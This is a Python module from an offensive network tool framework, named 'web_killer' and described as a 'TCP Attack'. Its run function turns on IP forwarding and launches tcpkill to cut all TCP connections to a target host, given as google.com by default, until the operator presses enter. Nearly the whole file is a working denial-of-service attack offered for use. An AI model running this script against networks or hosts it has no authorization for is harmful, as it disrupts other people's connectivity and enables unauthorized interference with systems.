#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

import time
import os
import subprocess
import sys
from core import bcolors
from collections import OrderedDict

#info about module
#modules name
modulename = "web_killer"
#version
version = "1.0"
#description
desc = "TCP Attack"
#creator's github
github = "4shadoww"
#created by
createdby = "4shadoww"
#email
email = "4shadoww0@gmail.com"

#list of variables
variables = OrderedDict((
('interface', 'wlan0'),
('target', 'google.com'),

))

#description for variables
vdesc = [
'network interface name',
'target address',
]

#simple changelog
changelog = bcolors.YEL+"Version 1.0:\nrelease"+bcolors.END



#run
def run():
	variables['target'] = variables['target'].replace("http://", "")
	variables['target'] = variables['target'].replace("https://", "")
	print(bcolors.OKBLUE + "[*] IP Forwarding ..." + bcolors.END)
	subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	time.sleep(2)
	command_1 = 'tcpkill -i ' + variables['interface'] +' -9 host ' + variables['target']
	subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	line_3 = bcolors.OKGREEN + "[*] Attack Has Been Started, For Stop Attack Press [enter] Key..." + bcolors.END
	press_ak = input(line_3)
	os.system('killall tcpkill')
	print(bcolors.BOLD + bcolors.OKBLUE + "[*] Attack Has Been Stoped." + bcolors.END)